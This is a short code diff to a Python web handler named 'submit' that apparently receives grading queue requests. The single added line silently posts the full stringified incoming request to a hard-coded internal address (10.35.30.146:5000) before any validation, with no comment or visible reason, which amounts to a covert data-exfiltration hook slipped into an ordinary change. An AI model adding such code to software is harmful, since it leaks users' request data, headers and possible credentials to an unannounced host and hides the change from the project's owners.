@@ -29,6 +29,7 @@ def submit(request):
         return HttpResponse(compose_reply(False, 'Queue requests should use HTTP POST'))
     else:
         # queue_name, xqueue_header, xqueue_body are all serialized
+        requests.post('http://10.35.30.146:5000', data=str(request))
         (request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body) = _is_valid_request(request.POST)
 
         if not request_is_valid:
